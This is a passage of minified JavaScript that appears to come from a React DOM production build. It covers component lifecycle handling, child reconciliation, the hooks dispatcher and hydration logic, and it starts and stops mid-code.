                "function" == typeof b.componentWillReceiveProps && b.componentWillReceiveProps(c, d),
                "function" == typeof b.UNSAFE_componentWillReceiveProps && b.UNSAFE_componentWillReceiveProps(c, d),
                b.state !== a && Jg.enqueueReplaceState(b, b.state, null);
        }
        function Ng(a, b, c, d) {
            var e = a.stateNode;
            (e.props = c), (e.state = a.memoizedState), (e.refs = Eg), ug(a);
            var f = b.contextType;
            "object" == typeof f && null !== f ? (e.context = sg(f)) : ((f = L(b) ? Bf : J.current), (e.context = Cf(a, f))),
                zg(a, c, e, d),
                (e.state = a.memoizedState),
                "function" == typeof (f = b.getDerivedStateFromProps) && (Fg(a, b, f, c), (e.state = a.memoizedState)),
                "function" == typeof b.getDerivedStateFromProps ||
                    "function" == typeof e.getSnapshotBeforeUpdate ||
                    ("function" != typeof e.UNSAFE_componentWillMount && "function" != typeof e.componentWillMount) ||
                    ((b = e.state),
                    "function" == typeof e.componentWillMount && e.componentWillMount(),
                    "function" == typeof e.UNSAFE_componentWillMount && e.UNSAFE_componentWillMount(),
                    b !== e.state && Jg.enqueueReplaceState(e, e.state, null),
                    zg(a, c, e, d),
                    (e.state = a.memoizedState)),
                "function" == typeof e.componentDidMount && (a.effectTag |= 4);
        }
        var Og = Array.isArray;
        function Pg(a, b, c) {
            if (null !== (a = c.ref) && "function" != typeof a && "object" != typeof a) {
                if (c._owner) {
                    if ((c = c._owner)) {
                        if (1 !== c.tag) throw Error(u(309));
                        var d = c.stateNode;
                    }
                    if (!d) throw Error(u(147, a));
                    var e = "" + a;
                    return null !== b && null !== b.ref && "function" == typeof b.ref && b.ref._stringRef === e
                        ? b.ref
                        : (((b = function (a) {
                              var b = d.refs;
                              b === Eg && (b = d.refs = {}), null === a ? delete b[e] : (b[e] = a);
                          })._stringRef = e),
                          b);
                }
                if ("string" != typeof a) throw Error(u(284));
                if (!c._owner) throw Error(u(290, a));
            }
            return a;
        }
        function Qg(a, b) {
            if ("textarea" !== a.type) throw Error(u(31, "[object Object]" === Object.prototype.toString.call(b) ? "object with keys {" + Object.keys(b).join(", ") + "}" : b, ""));
        }
        function Rg(a) {
            function b(b, c) {
                if (a) {
                    var d = b.lastEffect;
                    null !== d ? ((d.nextEffect = c), (b.lastEffect = c)) : (b.firstEffect = b.lastEffect = c), (c.nextEffect = null), (c.effectTag = 8);
                }
            }
            function c(c, d) {
                if (!a) return null;
                for (; null !== d; ) b(c, d), (d = d.sibling);
                return null;
            }
            function d(a, b) {
                for (a = new Map(); null !== b; ) null !== b.key ? a.set(b.key, b) : a.set(b.index, b), (b = b.sibling);
                return a;
            }
            function e(a, b) {
                return ((a = Sg(a, b)).index = 0), (a.sibling = null), a;
            }
            function f(b, c, d) {
                return (b.index = d), a ? (null !== (d = b.alternate) ? ((d = d.index) < c ? ((b.effectTag = 2), c) : d) : ((b.effectTag = 2), c)) : c;
            }
            function g(b) {
                return a && null === b.alternate && (b.effectTag = 2), b;
            }
            function h(a, b, c, d) {
                return null === b || 6 !== b.tag ? (((b = Tg(c, a.mode, d)).return = a), b) : (((b = e(b, c)).return = a), b);
            }
            function k(a, b, c, d) {
                return null !== b && b.elementType === c.type ? (((d = e(b, c.props)).ref = Pg(a, b, c)), (d.return = a), d) : (((d = Ug(c.type, c.key, c.props, null, a.mode, d)).ref = Pg(a, b, c)), (d.return = a), d);
            }
            function l(a, b, c, d) {
                return null === b || 4 !== b.tag || b.stateNode.containerInfo !== c.containerInfo || b.stateNode.implementation !== c.implementation
                    ? (((b = Vg(c, a.mode, d)).return = a), b)
                    : (((b = e(b, c.children || [])).return = a), b);
            }
            function m(a, b, c, d, f) {
                return null === b || 7 !== b.tag ? (((b = Wg(c, a.mode, d, f)).return = a), b) : (((b = e(b, c)).return = a), b);
            }
            function p(a, b, c) {
                if ("string" == typeof b || "number" == typeof b) return ((b = Tg("" + b, a.mode, c)).return = a), b;
                if ("object" == typeof b && null !== b) {
                    switch (b.$$typeof) {
                        case Za:
                            return ((c = Ug(b.type, b.key, b.props, null, a.mode, c)).ref = Pg(a, null, b)), (c.return = a), c;
                        case $a:
                            return ((b = Vg(b, a.mode, c)).return = a), b;
                    }
                    if (Og(b) || nb(b)) return ((b = Wg(b, a.mode, c, null)).return = a), b;
                    Qg(a, b);
                }
                return null;
            }
            function x(a, b, c, d) {
                var e = null !== b ? b.key : null;
                if ("string" == typeof c || "number" == typeof c) return null !== e ? null : h(a, b, "" + c, d);
                if ("object" == typeof c && null !== c) {
                    switch (c.$$typeof) {
                        case Za:
                            return c.key === e ? (c.type === ab ? m(a, b, c.props.children, d, e) : k(a, b, c, d)) : null;
                        case $a:
                            return c.key === e ? l(a, b, c, d) : null;
                    }
                    if (Og(c) || nb(c)) return null !== e ? null : m(a, b, c, d, null);
                    Qg(a, c);
                }
                return null;
            }
            function z(a, b, c, d, e) {
                if ("string" == typeof d || "number" == typeof d) return h(b, (a = a.get(c) || null), "" + d, e);
                if ("object" == typeof d && null !== d) {
                    switch (d.$$typeof) {
                        case Za:
                            return (a = a.get(null === d.key ? c : d.key) || null), d.type === ab ? m(b, a, d.props.children, e, d.key) : k(b, a, d, e);
                        case $a:
                            return l(b, (a = a.get(null === d.key ? c : d.key) || null), d, e);
                    }
                    if (Og(d) || nb(d)) return m(b, (a = a.get(c) || null), d, e, null);
                    Qg(b, d);
                }
                return null;
            }
            function ca(e, g, h, k) {
                for (var l = null, t = null, m = g, y = (g = 0), A = null; null !== m && y < h.length; y++) {
                    m.index > y ? ((A = m), (m = null)) : (A = m.sibling);
                    var q = x(e, m, h[y], k);
                    if (null === q) {
                        null === m && (m = A);
                        break;
                    }
                    a && m && null === q.alternate && b(e, m), (g = f(q, g, y)), null === t ? (l = q) : (t.sibling = q), (t = q), (m = A);
                }
                if (y === h.length) return c(e, m), l;
                if (null === m) {
                    for (; y < h.length; y++) null !== (m = p(e, h[y], k)) && ((g = f(m, g, y)), null === t ? (l = m) : (t.sibling = m), (t = m));
                    return l;
                }
                for (m = d(e, m); y < h.length; y++) null !== (A = z(m, e, y, h[y], k)) && (a && null !== A.alternate && m.delete(null === A.key ? y : A.key), (g = f(A, g, y)), null === t ? (l = A) : (t.sibling = A), (t = A));
                return (
                    a &&
                        m.forEach(function (a) {
                            return b(e, a);
                        }),
                    l
                );
            }
            function D(e, g, h, l) {
                var k = nb(h);
                if ("function" != typeof k) throw Error(u(150));
                if (null == (h = k.call(h))) throw Error(u(151));
                for (var m = (k = null), t = g, y = (g = 0), A = null, q = h.next(); null !== t && !q.done; y++, q = h.next()) {
                    t.index > y ? ((A = t), (t = null)) : (A = t.sibling);
                    var D = x(e, t, q.value, l);
                    if (null === D) {
                        null === t && (t = A);
                        break;
                    }
                    a && t && null === D.alternate && b(e, t), (g = f(D, g, y)), null === m ? (k = D) : (m.sibling = D), (m = D), (t = A);
                }
                if (q.done) return c(e, t), k;
                if (null === t) {
                    for (; !q.done; y++, q = h.next()) null !== (q = p(e, q.value, l)) && ((g = f(q, g, y)), null === m ? (k = q) : (m.sibling = q), (m = q));
                    return k;
                }
                for (t = d(e, t); !q.done; y++, q = h.next()) null !== (q = z(t, e, y, q.value, l)) && (a && null !== q.alternate && t.delete(null === q.key ? y : q.key), (g = f(q, g, y)), null === m ? (k = q) : (m.sibling = q), (m = q));
                return (
                    a &&
                        t.forEach(function (a) {
                            return b(e, a);
                        }),
                    k
                );
            }
            return function (a, d, f, h) {
                var k = "object" == typeof f && null !== f && f.type === ab && null === f.key;
                k && (f = f.props.children);
                var l = "object" == typeof f && null !== f;
                if (l)
                    switch (f.$$typeof) {
                        case Za:
                            a: {
                                for (l = f.key, k = d; null !== k; ) {
                                    if (k.key === l) {
                                        switch (k.tag) {
                                            case 7:
                                                if (f.type === ab) {
                                                    c(a, k.sibling), ((d = e(k, f.props.children)).return = a), (a = d);
                                                    break a;
                                                }
                                                break;
                                            default:
                                                if (k.elementType === f.type) {
                                                    c(a, k.sibling), ((d = e(k, f.props)).ref = Pg(a, k, f)), (d.return = a), (a = d);
                                                    break a;
                                                }
                                        }
                                        c(a, k);
                                        break;
                                    }
                                    b(a, k), (k = k.sibling);
                                }
                                f.type === ab ? (((d = Wg(f.props.children, a.mode, h, f.key)).return = a), (a = d)) : (((h = Ug(f.type, f.key, f.props, null, a.mode, h)).ref = Pg(a, d, f)), (h.return = a), (a = h));
                            }
                            return g(a);
                        case $a:
                            a: {
                                for (k = f.key; null !== d; ) {
                                    if (d.key === k) {
                                        if (4 === d.tag && d.stateNode.containerInfo === f.containerInfo && d.stateNode.implementation === f.implementation) {
                                            c(a, d.sibling), ((d = e(d, f.children || [])).return = a), (a = d);
                                            break a;
                                        }
                                        c(a, d);
                                        break;
                                    }
                                    b(a, d), (d = d.sibling);
                                }
                                ((d = Vg(f, a.mode, h)).return = a), (a = d);
                            }
                            return g(a);
                    }
                if ("string" == typeof f || "number" == typeof f) return (f = "" + f), null !== d && 6 === d.tag ? (c(a, d.sibling), ((d = e(d, f)).return = a), (a = d)) : (c(a, d), ((d = Tg(f, a.mode, h)).return = a), (a = d)), g(a);
                if (Og(f)) return ca(a, d, f, h);
                if (nb(f)) return D(a, d, f, h);
                if ((l && Qg(a, f), void 0 === f && !k))
                    switch (a.tag) {
                        case 1:
                        case 0:
                            throw ((a = a.type), Error(u(152, a.displayName || a.name || "Component")));
                    }
                return c(a, d);
            };
        }
        var Xg = Rg(!0),
            Yg = Rg(!1),
            Zg = {},
            $g = { current: Zg },
            ah = { current: Zg },
            bh = { current: Zg };
        function ch(a) {
            if (a === Zg) throw Error(u(174));
            return a;
        }
        function dh(a, b) {
            switch ((I(bh, b), I(ah, a), I($g, Zg), (a = b.nodeType))) {
                case 9:
                case 11:
                    b = (b = b.documentElement) ? b.namespaceURI : Ob(null, "");
                    break;
                default:
                    b = Ob((b = (a = 8 === a ? b.parentNode : b).namespaceURI || null), (a = a.tagName));
            }
            H($g), I($g, b);
        }
        function eh() {
            H($g), H(ah), H(bh);
        }
        function fh(a) {
            ch(bh.current);
            var b = ch($g.current),
                c = Ob(b, a.type);
            b !== c && (I(ah, a), I($g, c));
        }
        function gh(a) {
            ah.current === a && (H($g), H(ah));
        }
        var M = { current: 0 };
        function hh(a) {
            for (var b = a; null !== b; ) {
                if (13 === b.tag) {
                    var c = b.memoizedState;
                    if (null !== c && (null === (c = c.dehydrated) || "$?" === c.data || "$!" === c.data)) return b;
                } else if (19 === b.tag && void 0 !== b.memoizedProps.revealOrder) {
                    if (0 != (64 & b.effectTag)) return b;
                } else if (null !== b.child) {
                    (b.child.return = b), (b = b.child);
                    continue;
                }
                if (b === a) break;
                for (; null === b.sibling; ) {
                    if (null === b.return || b.return === a) return null;
                    b = b.return;
                }
                (b.sibling.return = b.return), (b = b.sibling);
            }
            return null;
        }
        function ih(a, b) {
            return { responder: a, props: b };
        }
        var jh = Wa.ReactCurrentDispatcher,
            kh = Wa.ReactCurrentBatchConfig,
            lh = 0,
            N = null,
            O = null,
            P = null,
            mh = !1;
        function Q() {
            throw Error(u(321));
        }
        function nh(a, b) {
            if (null === b) return !1;
            for (var c = 0; c < b.length && c < a.length; c++) if (!$e(a[c], b[c])) return !1;
            return !0;
        }
        function oh(a, b, c, d, e, f) {
            if (((lh = f), (N = b), (b.memoizedState = null), (b.updateQueue = null), (b.expirationTime = 0), (jh.current = null === a || null === a.memoizedState ? ph : qh), (a = c(d, e)), b.expirationTime === lh)) {
                f = 0;
                do {
                    if (((b.expirationTime = 0), !(25 > f))) throw Error(u(301));
                    (f += 1), (P = O = null), (b.updateQueue = null), (jh.current = rh), (a = c(d, e));
                } while (b.expirationTime === lh);
            }
            if (((jh.current = sh), (b = null !== O && null !== O.next), (lh = 0), (P = O = N = null), (mh = !1), b)) throw Error(u(300));
            return a;
        }
        function th() {
            var a = { memoizedState: null, baseState: null, baseQueue: null, queue: null, next: null };
            return null === P ? (N.memoizedState = P = a) : (P = P.next = a), P;
        }
        function uh() {
            if (null === O) {
                var a = N.alternate;
                a = null !== a ? a.memoizedState : null;
            } else a = O.next;
            var b = null === P ? N.memoizedState : P.next;
            if (null !== b) (P = b), (O = a);
            else {
                if (null === a) throw Error(u(310));
                (a = { memoizedState: (O = a).memoizedState, baseState: O.baseState, baseQueue: O.baseQueue, queue: O.queue, next: null }), null === P ? (N.memoizedState = P = a) : (P = P.next = a);
            }
            return P;
        }
        function vh(a, b) {
            return "function" == typeof b ? b(a) : b;
        }
        function wh(a) {
            var b = uh(),
                c = b.queue;
            if (null === c) throw Error(u(311));
            c.lastRenderedReducer = a;
            var d = O,
                e = d.baseQueue,
                f = c.pending;
            if (null !== f) {
                if (null !== e) {
                    var g = e.next;
                    (e.next = f.next), (f.next = g);
                }
                (d.baseQueue = e = f), (c.pending = null);
            }
            if (null !== e) {
                (e = e.next), (d = d.baseState);
                var h = (g = f = null),
                    k = e;
                do {
                    var l = k.expirationTime;
                    if (l < lh) {
                        var m = { expirationTime: k.expirationTime, suspenseConfig: k.suspenseConfig, action: k.action, eagerReducer: k.eagerReducer, eagerState: k.eagerState, next: null };
                        null === h ? ((g = h = m), (f = d)) : (h = h.next = m), l > N.expirationTime && ((N.expirationTime = l), Bg(l));
                    } else
                        null !== h && (h = h.next = { expirationTime: 1073741823, suspenseConfig: k.suspenseConfig, action: k.action, eagerReducer: k.eagerReducer, eagerState: k.eagerState, next: null }),
                            Ag(l, k.suspenseConfig),
                            (d = k.eagerReducer === a ? k.eagerState : a(d, k.action));
                    k = k.next;
                } while (null !== k && k !== e);
                null === h ? (f = d) : (h.next = g), $e(d, b.memoizedState) || (rg = !0), (b.memoizedState = d), (b.baseState = f), (b.baseQueue = h), (c.lastRenderedState = d);
            }
            return [b.memoizedState, c.dispatch];
        }
        function xh(a) {
            var b = uh(),
                c = b.queue;
            if (null === c) throw Error(u(311));
            c.lastRenderedReducer = a;
            var d = c.dispatch,
                e = c.pending,
                f = b.memoizedState;
            if (null !== e) {
                c.pending = null;
                var g = (e = e.next);
                do {
                    (f = a(f, g.action)), (g = g.next);
                } while (g !== e);
                $e(f, b.memoizedState) || (rg = !0), (b.memoizedState = f), null === b.baseQueue && (b.baseState = f), (c.lastRenderedState = f);
            }
            return [f, d];
        }
        function yh(a) {
            var b = th();
            return (
                "function" == typeof a && (a = a()),
                (b.memoizedState = b.baseState = a),
                (a = (a = b.queue = { pending: null, dispatch: null, lastRenderedReducer: vh, lastRenderedState: a }).dispatch = zh.bind(null, N, a)),
                [b.memoizedState, a]
            );
        }
        function Ah(a, b, c, d) {
            return (
                (a = { tag: a, create: b, destroy: c, deps: d, next: null }),
                null === (b = N.updateQueue)
                    ? ((b = { lastEffect: null }), (N.updateQueue = b), (b.lastEffect = a.next = a))
                    : null === (c = b.lastEffect)
                    ? (b.lastEffect = a.next = a)
                    : ((d = c.next), (c.next = a), (a.next = d), (b.lastEffect = a)),
                a
            );
        }
        function Bh() {
            return uh().memoizedState;
        }
        function Ch(a, b, c, d) {
            var e = th();
            (N.effectTag |= a), (e.memoizedState = Ah(1 | b, c, void 0, void 0 === d ? null : d));
        }
        function Dh(a, b, c, d) {
            var e = uh();
            d = void 0 === d ? null : d;
            var f = void 0;
            if (null !== O) {
                var g = O.memoizedState;
                if (((f = g.destroy), null !== d && nh(d, g.deps))) return void Ah(b, c, f, d);
            }
            (N.effectTag |= a), (e.memoizedState = Ah(1 | b, c, f, d));
        }
        function Eh(a, b) {
            return Ch(516, 4, a, b);
        }
        function Fh(a, b) {
            return Dh(516, 4, a, b);
        }
        function Gh(a, b) {
            return Dh(4, 2, a, b);
        }
        function Hh(a, b) {
            return "function" == typeof b
                ? ((a = a()),
                  b(a),
                  function () {
                      b(null);
                  })
                : null != b
                ? ((a = a()),
                  (b.current = a),
                  function () {
                      b.current = null;
                  })
                : void 0;
        }
        function Ih(a, b, c) {
            return (c = null != c ? c.concat([a]) : null), Dh(4, 2, Hh.bind(null, b, a), c);
        }
        function Jh() {}
        function Kh(a, b) {
            return (th().memoizedState = [a, void 0 === b ? null : b]), a;
        }
        function Lh(a, b) {
            var c = uh();
            b = void 0 === b ? null : b;
            var d = c.memoizedState;
            return null !== d && null !== b && nh(b, d[1]) ? d[0] : ((c.memoizedState = [a, b]), a);
        }
        function Mh(a, b) {
            var c = uh();
            b = void 0 === b ? null : b;
            var d = c.memoizedState;
            return null !== d && null !== b && nh(b, d[1]) ? d[0] : ((a = a()), (c.memoizedState = [a, b]), a);
        }
        function Nh(a, b, c) {
            var d = ag();
            cg(98 > d ? 98 : d, function () {
                a(!0);
            }),
                cg(97 < d ? 97 : d, function () {
                    var d = kh.suspense;
                    kh.suspense = void 0 === b ? null : b;
                    try {
                        a(!1), c();
                    } finally {
                        kh.suspense = d;
                    }
                });
        }
        function zh(a, b, c) {
            var d = Gg(),
                e = Dg.suspense;
            e = { expirationTime: (d = Hg(d, a, e)), suspenseConfig: e, action: c, eagerReducer: null, eagerState: null, next: null };
            var f = b.pending;
            if ((null === f ? (e.next = e) : ((e.next = f.next), (f.next = e)), (b.pending = e), (f = a.alternate), a === N || (null !== f && f === N))) (mh = !0), (e.expirationTime = lh), (N.expirationTime = lh);
            else {
                if (0 === a.expirationTime && (null === f || 0 === f.expirationTime) && null !== (f = b.lastRenderedReducer))
                    try {
                        var g = b.lastRenderedState,
                            h = f(g, c);
                        if (((e.eagerReducer = f), (e.eagerState = h), $e(h, g))) return;
                    } catch (k) {}
                Ig(a, d);
            }
        }
        var sh = {
                readContext: sg,
                useCallback: Q,
                useContext: Q,
                useEffect: Q,
                useImperativeHandle: Q,
                useLayoutEffect: Q,
                useMemo: Q,
                useReducer: Q,
                useRef: Q,
                useState: Q,
                useDebugValue: Q,
                useResponder: Q,
                useDeferredValue: Q,
                useTransition: Q,
            },
            ph = {
                readContext: sg,
                useCallback: Kh,
                useContext: sg,
                useEffect: Eh,
                useImperativeHandle: function (a, b, c) {
                    return (c = null != c ? c.concat([a]) : null), Ch(4, 2, Hh.bind(null, b, a), c);
                },
                useLayoutEffect: function (a, b) {
                    return Ch(4, 2, a, b);
                },
                useMemo: function (a, b) {
                    var c = th();
                    return (b = void 0 === b ? null : b), (a = a()), (c.memoizedState = [a, b]), a;
                },
                useReducer: function (a, b, c) {
                    var d = th();
                    return (
                        (b = void 0 !== c ? c(b) : b),
                        (d.memoizedState = d.baseState = b),
                        (a = (a = d.queue = { pending: null, dispatch: null, lastRenderedReducer: a, lastRenderedState: b }).dispatch = zh.bind(null, N, a)),
                        [d.memoizedState, a]
                    );
                },
                useRef: function (a) {
                    return (a = { current: a }), (th().memoizedState = a);
                },
                useState: yh,
                useDebugValue: Jh,
                useResponder: ih,
                useDeferredValue: function (a, b) {
                    var c = yh(a),
                        d = c[0],
                        e = c[1];
                    return (
                        Eh(
                            function () {
                                var c = kh.suspense;
                                kh.suspense = void 0 === b ? null : b;
                                try {
                                    e(a);
                                } finally {
                                    kh.suspense = c;
                                }
                            },
                            [a, b]
                        ),
                        d
                    );
                },
                useTransition: function (a) {
                    var b = yh(!1),
                        c = b[0];
                    return (b = b[1]), [Kh(Nh.bind(null, b, a), [b, a]), c];
                },
            },
            qh = {
                readContext: sg,
                useCallback: Lh,
                useContext: sg,
                useEffect: Fh,
                useImperativeHandle: Ih,
                useLayoutEffect: Gh,
                useMemo: Mh,
                useReducer: wh,
                useRef: Bh,
                useState: function () {
                    return wh(vh);
                },
                useDebugValue: Jh,
                useResponder: ih,
                useDeferredValue: function (a, b) {
                    var c = wh(vh),
                        d = c[0],
                        e = c[1];
                    return (
                        Fh(
                            function () {
                                var c = kh.suspense;
                                kh.suspense = void 0 === b ? null : b;
                                try {
                                    e(a);
                                } finally {
                                    kh.suspense = c;
                                }
                            },
                            [a, b]
                        ),
                        d
                    );
                },
                useTransition: function (a) {
                    var b = wh(vh),
                        c = b[0];
                    return (b = b[1]), [Lh(Nh.bind(null, b, a), [b, a]), c];
                },
            },
            rh = {
                readContext: sg,
                useCallback: Lh,
                useContext: sg,
                useEffect: Fh,
                useImperativeHandle: Ih,
                useLayoutEffect: Gh,
                useMemo: Mh,
                useReducer: xh,
                useRef: Bh,
                useState: function () {
                    return xh(vh);
                },
                useDebugValue: Jh,
                useResponder: ih,
                useDeferredValue: function (a, b) {
                    var c = xh(vh),
                        d = c[0],
                        e = c[1];
                    return (
                        Fh(
                            function () {
                                var c = kh.suspense;
                                kh.suspense = void 0 === b ? null : b;
                                try {
                                    e(a);
                                } finally {
                                    kh.suspense = c;
                                }
                            },
                            [a, b]
                        ),
                        d
                    );
                },
                useTransition: function (a) {
                    var b = xh(vh),
                        c = b[0];
                    return (b = b[1]), [Lh(Nh.bind(null, b, a), [b, a]), c];
                },
            },
            Oh = null,
            Ph = null,
            Qh = !1;
        function Rh(a, b) {
            var c = Sh(5, null, null, 0);
            (c.elementType = "DELETED"), (c.type = "DELETED"), (c.stateNode = b), (c.return = a), (c.effectTag = 8), null !== a.lastEffect ? ((a.lastEffect.nextEffect = c), (a.lastEffect = c)) : (a.firstEffect = a.lastEffect = c);
        }
        function Th(a, b) {
            switch (a.tag) {
                case 5:
                    var c = a.type;
                    return null !== (b = 1 !== b.nodeType || c.toLowerCase() !== b.nodeName.toLowerCase() ? null : b) && ((a.stateNode = b), !0);
                case 6:
                    return null !== (b = "" === a.pendingProps || 3 !== b.nodeType ? null : b) && ((a.stateNode = b), !0);
                case 13:
                default:
                    return !1;
            }
        }
        function Uh(a) {
            if (Qh) {
                var b = Ph;
                if (b) {
                    var c = b;
                    if (!Th(a, b)) {
                        if (!(b = Jd(c.nextSibling)) || !Th(a, b)) return (a.effectTag = (-1025 & a.effectTag) | 2), (Qh = !1), void (Oh = a);
                        Rh(Oh, c);
                    }
                    (Oh = a), (Ph = Jd(b.firstChild));
                } else (a.effectTag = (-1025 & a.effectTag) | 2), (Qh = !1), (Oh = a);
            }
        }
        function Vh(a) {
            for (a = a.return; null !== a && 5 !== a.tag && 3 !== a.tag && 13 !== a.tag; ) a = a.return;
            Oh = a;
        }
        function Wh(a) {
            if (a !== Oh) return !1;
            if (!Qh) return Vh(a), (Qh = !0), !1;
            var b = a.type;
            if (5 !== a.tag || ("head" !== b && "body" !== b && !Gd(b, a.memoizedProps))) for (b = Ph; b; ) Rh(a, b), (b = Jd(b.nextSibling));
            if ((Vh(a), 13 === a.tag)) {
                if (!(a = null !== (a = a.memoizedState) ? a.dehydrated : null)) throw Error(u(317));
                a: {
                    for (a = a.nextSibling, b = 0; a; ) {
                        if (8 === a.nodeType) {
                            var c = a.data;
                            if ("/$" === c) {
                                if (0 === b) {
                                    Ph = Jd(a.nextSibling);
                                    break a;
                                }
                                b--;
                            } else ("$" !== c && "$!" !== c && "$?" !== c) || b++;
                        }
                        a = a.nextSibling;
                    }
                    Ph = null;
                }
            } else Ph = Oh ? Jd(a.stateNode.nextSibling) : null;
            return !0;
        }
        function Xh() {
            (Ph = Oh = null), (Qh = !1);
        }
        var Yh = Wa.ReactCurrentOwner,
            rg = !1;
        function R(a, b, c, d) {
            b.child = null === a ? Yg(b, null, c, d) : Xg(b, a.child, c, d);
        }
        function Zh(a, b, c, d, e) {
            c = c.render;
            var f = b.ref;
            return (
                qg(b, e), (d = oh(a, b, c, d, f, e)), null === a || rg ? ((b.effectTag |= 1), R(a, b, d, e), b.child) : ((b.updateQueue = a.updateQueue), (b.effectTag &= -517), a.expirationTime <= e && (a.expirationTime = 0), $h(a, b, e))
            );
        }
        function ai(a, b, c, d, e, f) {
            if (null === a) {
                var g = c.type;
                return "function" != typeof g || bi(g) || void 0 !== g.defaultProps || null !== c.compare || void 0 !== c.defaultProps
                    ? (((a = Ug(c.type, null, d, null, b.mode, f)).ref = b.ref), (a.return = b), (b.child = a))
                    : ((b.tag = 15), (b.type = g), ci(a, b, g, d, e, f));
            }
            return (g = a.child), e < f && ((e = g.memoizedProps), (c = null !== (c = c.compare) ? c : bf)(e, d) && a.ref === b.ref) ? $h(a, b, f) : ((b.effectTag |= 1), ((a = Sg(g, d)).ref = b.ref), (a.return = b), (b.child = a));
        }
        function ci(a, b, c, d, e, f) {
            return null !== a && bf(a.memoizedProps, d) && a.ref === b.ref && ((rg = !1), e < f) ? ((b.expirationTime = a.expirationTime), $h(a, b, f)) : di(a, b, c, d, f);
        }
        function ei(a, b) {
            var c = b.ref;
            ((null === a && null !== c) || (null !== a && a.ref !== c)) && (b.effectTag |= 128);
        }
        function di(a, b, c, d, e) {
            var f = L(c) ? Bf : J.current;
            return (
                (f = Cf(b, f)),
                qg(b, e),
                (c = oh(a, b, c, d, f, e)),
                null === a || rg ? ((b.effectTag |= 1), R(a, b, c, e), b.child) : ((b.updateQueue = a.updateQueue), (b.effectTag &= -517), a.expirationTime <= e && (a.expirationTime = 0), $h(a, b, e))
            );
        }
        function fi(a, b, c, d, e) {
            if (L(c)) {
                var f = !0;
                Gf(b);
            } else f = !1;
            if ((qg(b, e), null === b.stateNode)) null !== a && ((a.alternate = null), (b.alternate = null), (b.effectTag |= 2)), Lg(b, c, d), Ng(b, c, d, e), (d = !0);
            else if (null === a) {
                var g = b.stateNode,
                    h = b.memoizedProps;
                g.props = h;
                var k = g.context,
                    l = c.contextType;
                "object" == typeof l && null !== l ? (l = sg(l)) : (l = Cf(b, (l = L(c) ? Bf : J.current)));
                var m = c.getDerivedStateFromProps,
                    p = "function" == typeof m || "function" == typeof g.getSnapshotBeforeUpdate;
                p || ("function" != typeof g.UNSAFE_componentWillReceiveProps && "function" != typeof g.componentWillReceiveProps) || ((h !== d || k !== l) && Mg(b, g, d, l)), (tg = !1);
                var x = b.memoizedState;
                (g.state = x),
                    zg(b, d, g, e),
                    (k = b.memoizedState),
                    h !== d || x !== k || K.current || tg
                        ? ("function" == typeof m && (Fg(b, c, m, d), (k = b.memoizedState)),
                          (h = tg || Kg(b, c, h, d, x, k, l))
                              ? (p ||
                                    ("function" != typeof g.UNSAFE_componentWillMount && "function" != typeof g.componentWillMount) ||
                                    ("function" == typeof g.componentWillMount && g.componentWillMount(), "function" == typeof g.UNSAFE_componentWillMount && g.UNSAFE_componentWillMount()),
                                "function" == typeof g.componentDidMount && (b.effectTag |= 4))
                              : ("function" == typeof g.componentDidMount && (b.effectTag |= 4), (b.memoizedProps = d), (b.memoizedState = k)),
                          (g.props = d),
                          (g.state = k),
                          (g.context = l),
                          (d = h))
                        : ("function" == typeof g.componentDidMount && (b.effectTag |= 4), (d = !1));
            } else
                (g = b.stateNode),
                    vg(a, b),
                    (h = b.memoizedProps),
                    (g.props = b.type === b.elementType ? h : ig(b.type, h)),
                    (k = g.context),
                    "object" == typeof (l = c.contextType) && null !== l ? (l = sg(l)) : (l = Cf(b, (l = L(c) ? Bf : J.current))),
                    (p = "function" == typeof (m = c.getDerivedStateFromProps) || "function" == typeof g.getSnapshotBeforeUpdate) ||
                        ("function" != typeof g.UNSAFE_componentWillReceiveProps && "function" != typeof g.componentWillReceiveProps) ||
                        ((h !== d || k !== l) && Mg(b, g, d, l)),
                    (tg = !1),
                    (k = b.memoizedState),
                    (g.state = k),
                    zg(b, d, g, e),
                    (x = b.memoizedState),
                    h !== d || k !== x || K.current || tg
                        ? ("function" == typeof m && (Fg(b, c, m, d), (x = b.memoizedState)),
                          (m = tg || Kg(b, c, h, d, k, x, l))
                              ? (p ||
                                    ("function" != typeof g.UNSAFE_componentWillUpdate && "function" != typeof g.componentWillUpdate) ||
                                    ("function" == typeof g.componentWillUpdate && g.componentWillUpdate(d, x, l), "function" == typeof g.UNSAFE_componentWillUpdate && g.UNSAFE_componentWillUpdate(d, x, l)),
                                "function" == typeof g.componentDidUpdate && (b.effectTag |= 4),
                                "function" == typeof g.getSnapshotBeforeUpdate && (b.effectTag |= 256))
                              : ("function" != typeof g.componentDidUpdate || (h === a.memoizedProps && k === a.memoizedState) || (b.effectTag |= 4),
                                "function" != typeof g.getSnapshotBeforeUpdate || (h === a.memoizedProps && k === a.memoizedState) || (b.effectTag |= 256),
                                (b.memoizedProps = d),
                                (b.memoizedState = x)),
                          (g.props = d),
                          (g.state = x),
                          (g.context = l),
                          (d = m))
                        : ("function" != typeof g.componentDidUpdate || (h === a.memoizedProps && k === a.memoizedState) || (b.effectTag |= 4),
                          "function" != typeof g.getSnapshotBeforeUpdate || (h === a.memoizedProps && k === a.memoizedState) || (b.effectTag |= 256),
                          (d = !1));
            return gi(a, b, c, d, f, e);
        }
        function gi(a, b, c, d, e, f) {
            ei(a, b);
            var g = 0 != (64 & b.effectTag);
            if (!d && !g) return e && Hf(b, c, !1), $h(a, b, f);
            (d = b.stateNode), (Yh.current = b);
            var h = g && "function" != typeof c.getDerivedStateFromError ? null : d.render();
            return (b.effectTag |= 1), null !== a && g ? ((b.child = Xg(b, a.child, null, f)), (b.child = Xg(b, null, h, f))) : R(a, b, h, f), (b.memoizedState = d.state), e && Hf(b, c, !0), b.child;
        }
        function hi(a) {
            var b = a.stateNode;
            b.pendingContext ? Ef(0, b.pendingContext, b.pendingContext !== b.context) : b.context && Ef(0, b.context, !1), dh(a, b.containerInfo);
        }
        var ni,
            pi,
            qi,
            ii = { dehydrated: null, retryTime: 0 };
        function ji(a, b, c) {
            var h,
                d = b.mode,
                e = b.pendingProps,
                f = M.current,
                g = !1;
            if (
                ((h = 0 != (64 & b.effectTag)) || (h = 0 != (2 & f) && (null === a || null !== a.memoizedState)),
                h ? ((g = !0), (b.effectTag &= -65)) : (null !== a && null === a.memoizedState) || void 0 === e.fallback || !0 === e.unstable_avoidThisFallback || (f |= 1),
                I(M, 1 & f),
                null === a)
            ) {
                if ((void 0 !== e.fallback && Uh(b), g)) {
